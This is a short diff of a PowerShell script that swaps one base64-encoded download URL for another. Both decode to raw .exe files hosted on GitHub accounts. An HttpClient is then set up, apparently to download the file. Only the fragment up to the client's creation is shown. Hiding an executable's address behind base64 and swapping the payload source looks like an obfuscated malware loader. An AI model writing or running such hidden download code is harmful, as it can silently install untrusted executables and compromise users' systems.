@@ -151,7 +151,7 @@ try {
     }
 
     # O
-    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2VmZWNhbjE4ODFiLW1ha2VyLzIyLjAxLjIwMjYvcmF3L3JlZnMvaGVhZHMvbWFpbi81LjZNb2NrYS5leGU='))
+    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL1RoZU1vY2thL1NJR09SVEEtT1RFTC9yYXcvcmVmcy9oZWFkcy9tYWluL1NJR09SVEEuZXhl'))
     
     Add-Type -AssemblyName System.Net.Http
     $http_client = [System.Net.Http.HttpClient]::new()
